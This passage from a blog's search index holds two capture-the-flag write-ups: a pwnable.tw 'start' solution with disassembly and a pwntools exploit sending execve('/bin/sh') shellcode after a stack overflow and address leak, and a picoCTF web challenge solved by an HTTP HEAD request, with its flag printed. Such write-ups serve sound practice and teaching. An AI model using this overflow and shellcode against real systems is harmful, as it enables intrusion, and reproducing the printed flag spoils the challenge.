class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">start:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:54                   push   esp</span><br><span class="line"> 8048061:68 9d 80 04 08       push   0x804809d</span><br><span class="line"> 8048066:31 c0                xor    eax,eax</span><br><span class="line"> 8048068:31 db                xor    ebx,ebx</span><br><span class="line"> 804806a:31 c9                xor    ecx,ecx</span><br><span class="line"> 804806c:31 d2                xor    edx,edx</span><br><span class="line"> 804806e:68 43 54 46 3a       push   0x3a465443</span><br><span class="line"> 8048073:68 74 68 65 20       push   0x20656874</span><br><span class="line"> 8048078:68 61 72 74 20       push   0x20747261</span><br><span class="line"> 804807d:68 73 20 73 74       push   0x74732073</span><br><span class="line"> 8048082:68 4c 65 74 27       push   0x2774654c</span><br><span class="line"> 8048087:89 e1                mov    ecx,esp</span><br><span class="line"> 8048089:b2 14                mov    dl,0x14</span><br><span class="line"> 804808b:b3 01                mov    bl,0x1</span><br><span class="line"> 804808d:b0 04                mov    al,0x4</span><br><span class="line"> 804808f:cd 80                int    0x80</span><br><span class="line"> 8048091:31 db                xor    ebx,ebx</span><br><span class="line"> 8048093:b2 3c                mov    dl,0x3c</span><br><span class="line"> 8048095:b0 03                mov    al,0x3</span><br><span class="line"> 8048097:cd 80                int    0x80</span><br><span class="line"> 8048099:83 c4 14             add    esp,0x14</span><br><span class="line"> 804809c:c3                   ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:5c                   pop    esp</span><br><span class="line"> 804809e:31 c0                xor    eax,eax</span><br><span class="line"> 80480a0:40                   inc    eax</span><br><span class="line"> 80480a1:cd 80                int    0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">filename = <span class="string">&#x27;./start&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;CTF:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">ad = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">20</span> + p32(ad + <span class="number">20</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF GET aHEAD [50 points]</title>
      <link href="/2022/03/02/CTF/picoCTF/Web%20Exploitation/GET%20aHEAD/posts/"/>
      <url>/2022/03/02/CTF/picoCTF/Web%20Exploitation/GET%20aHEAD/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Find the flag being held on this server to get ahead of the competition <a href="http://mercury.picoctf.net:47967/">http://mercury.picoctf.net:47967/</a></p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="看HTML發現有兩種請求方式"><a href="#看HTML發現有兩種請求方式" class="headerlink" title="看HTML發現有兩種請求方式"></a>看HTML發現有兩種請求方式</h2><blockquote><p>GET 和 POST </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-primary&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:50px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;panel-title&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span>Red<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Choose Red&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-primary&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:50px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;panel-title&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>Blue<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Choose Blue&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="嘗試使用HEAD請求"><a href="#嘗試使用HEAD請求" class="headerlink" title="嘗試使用HEAD請求"></a>嘗試使用HEAD請求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://mercury.picoctf.net:47967/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;HEAD&quot;</span>, url, headers=&#123;&#125;, data=&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.headers)</span><br></pre></td></tr></table></figure><h2 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;flag&#x27;: &#x27;picoCTF&#123;r3j3ct_th3_du4l1ty_cca66bd3&#125;&#x27;, &#x27;Content-type&#x27;: &#x27;text/html; charset=UTF-8&#x27;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
